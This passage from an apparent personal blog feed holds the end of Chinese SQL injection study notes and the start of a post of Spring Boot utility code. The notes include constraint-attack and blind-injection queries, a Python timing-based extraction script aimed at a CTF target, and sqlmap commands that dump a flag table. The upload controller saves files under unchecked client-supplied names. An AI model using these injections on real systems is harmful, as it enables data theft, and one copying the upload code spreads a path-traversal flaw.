href="https://www.cnblogs.com/baimaoma/p/8608490.html" target="_blank" rel="noopener">https://www.cnblogs.com/baimaoma/p/8608490.html</a></p></blockquote></li></ol><h4 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h4><p>简单的来说，就是在sql中会因为一些空格来进行绕过，以账号密码注册为例子</p><ol><li>默认后台有admin/password01</li><li>我们注册时候使用admin         /password02</li><li>登陆的时候用admin/password02就可以正常的登陆</li><li>原因说明：<blockquote><p>其实入库的时候会自动减去注册时尾部的空格，但是代码在写的时候却没有去掉空格，所以加上空格之后就不会查重，但是入了库就又重复了</p></blockquote></li></ol><h4 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h4><p>最简单的注入在于，无论你去注入什么，或者搜索或者选择都是会有相应的显示的，但是还有一部分的盲注是没有提示的，你无法得知自己是否sql注入成功，所以插入sql中的sleep（），get_lock()等系列函数，通过时间延迟来判断是否注入成功，以为盲注全靠猜，因此需要脚本来实现盲注 。</p><h4 id="盲注分类"><a href="#盲注分类" class="headerlink" title="盲注分类"></a>盲注分类</h4><p>Time盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id = 1 AND (SELECTif((SELECT substr(table_name,1,1)  FROM users  limit 0,1)=&apos;e&apos;,sleep(10),null))</span><br></pre></td></tr></table></figure></p><p>•Bool盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id = 1 and  ascii(substr((SELECT  database()),1,1))&gt;99</span><br></pre></td></tr></table></figure></p><h5 id="ctf盲注代码："><a href="#ctf盲注代码：" class="headerlink" title="ctf盲注代码："></a>ctf盲注代码：</h5><p>靶机： <a href="http://114.55.36.69:8007/" target="_blank" rel="noopener">http://114.55.36.69:8007/</a><br>注入猜测： <a href="http://114.55.36.69:8007/article.php?id=1&#39;" target="_blank" rel="noopener">http://114.55.36.69:8007/article.php?id=1&#39;</a> and sleep(5) %23<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://114.55.36.69:8007/article.php?id=1'"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        url_req = url + <span class="string">" and if(ascii(substr((content),&#123;0&#125;,1))=&#123;1&#125;,get_lock('test',3),1)%23"</span>.format(i+<span class="number">1</span>,str(c)) <span class="comment"># 盲注猜测</span></span><br><span class="line">        print(url_req)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(url_req) <span class="comment"># 请求</span></span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2.5</span>: <span class="comment"># 时间超过3秒说明注入成功，计入data</span></span><br><span class="line">            data += chr(c)</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">print(<span class="string">'data:'</span>,data) <span class="comment"># 输出结果</span></span><br></pre></td></tr></table></figure></p><blockquote><p>大佬帖子： <a href="https://www.cesafe.com/3993.html" target="_blank" rel="noopener">https://www.cesafe.com/3993.html</a> </p></blockquote><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>感受了一哈，牛逼嗷</p><h5 id="sqlmap-post"><a href="#sqlmap-post" class="headerlink" title="sqlmap-post"></a>sqlmap-post</h5><p>post的特殊一些，所有会把用burpsuite导出一份txt文件用于进行注入</p><ol><li>判断是什么注入类型，是什么类型的数据库<blockquote><p>python sqlmap.py -r test\post.txt</p></blockquote></li><li>通过加后缀 –dbs 可以看到数据库的版本等更多信息<blockquote><p>python sqlmap.py -r test\post.txt –dbs</p></blockquote></li><li>通过后缀 -D 指定具体数据库， 利用后缀 –table 可以看到具体数据库的具体表名<blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag –tables</p></blockquote></li><li>通过后缀 -T 进一步指定某表的具体的列名<blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g –columns</p></blockquote></li><li>通过后缀 -C 具体指定具体的一列 <blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g -C “skctf_flag” –dump</p></blockquote></li><li>通过后缀 –search 查找字段<blockquote><p>python sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p></blockquote></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;基础sql注入&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot 一些常用配置【持续更新】</title>
    <link href="http://runindark.com/2019/08/07/Springboot%E5%90%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://runindark.com/2019/08/07/Springboot各类常用配置/</id>
    <published>2019-08-07T07:49:32.843Z</published>
    <updated>2019-08-07T07:57:57.562Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>Springboot 一些常用配置</excerpt></p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><h3 id="ID生成器"><a href="#ID生成器" class="headerlink" title="ID生成器"></a>ID生成器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.Data;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 各类id生成工具</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IdUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成用户ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Uid</span> <span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String uid = <span class="string">"U"</span> + UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">return</span> uid  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成商家ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Bid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String bid = <span class="string">"B"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> bid  ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成商品ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Gid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String gid = <span class="string">"G"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> gid  ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成订单ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Olid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> hashCodeV = UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">if</span> (hashCodeV &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            hashCodeV = - hashCodeV ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>   <span class="string">"OL"</span>+ hashCodeV;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成红包ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Cid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String cid = <span class="string">"C"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> cid  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成轮播图ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Sid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String sid = <span class="string">"S"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> sid ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成主界面小图标ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Hid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String hid = <span class="string">"H"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> hid ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成二维码小图标</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Qrid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCodeV = UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">if</span> (hashCodeV &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            hashCodeV = - hashCodeV ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>   <span class="string">"OR"</span>+ hashCodeV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图片处理器（只留下图片名）"><a href="#图片处理器（只留下图片名）" class="headerlink" title="图片处理器（只留下图片名）"></a>图片处理器（只留下图片名）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PicUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">CutPicStr</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(str);</span><br><span class="line">        File[] fs = file.listFiles();</span><br><span class="line">        List&lt;String&gt; paths = <span class="keyword">new</span> ArrayList&lt;&gt;() ;</span><br><span class="line">        <span class="keyword">for</span>(File f:fs)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!f.isDirectory()) &#123;</span><br><span class="line"></span><br><span class="line">                paths.add(f.getName()) ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  paths;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间格式化器"><a href="#时间格式化器" class="headerlink" title="时间格式化器"></a>时间格式化器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String  <span class="title">getTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line">        Date date = calendar.getTime() ;</span><br><span class="line">        SimpleDateFormat sdf =<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span> );</span><br><span class="line">        String s = sdf.format(date) ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTime</span><span class="params">(Date date)</span></span>&#123;</span><br><span class="line">        SimpleDateFormat sdf =<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span> );</span><br><span class="line">        String s = sdf.format(date) ;</span><br><span class="line">        <span class="keyword">return</span>  s ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维码生成器"><a href="#二维码生成器" class="headerlink" title="二维码生成器"></a>二维码生成器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.service.QR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 二维码生成服务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QRService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String URL = <span class="string">"http://qr.liantu.com/api.php?text="</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 二维码图片链接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">GenerateQR</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String OR_Code_Url = URL + id ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> OR_Code_Url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务使用"><a href="#服务使用" class="headerlink" title="服务使用"></a>服务使用</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.controller.file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.IdUtil;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.token.NoToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.swing.filechooser.FileView;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/file"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadFileController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String ip = <span class="string">"http://118.31.120.92/wechat/"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String spath = <span class="string">"/root/local/user/obox/pic/"</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户头像上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadusericon"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">UserIconUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"user/usericon/"</span> + IdUtil.Uid() + <span class="string">"/"</span> ;</span><br><span class="line">        String docname =  file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        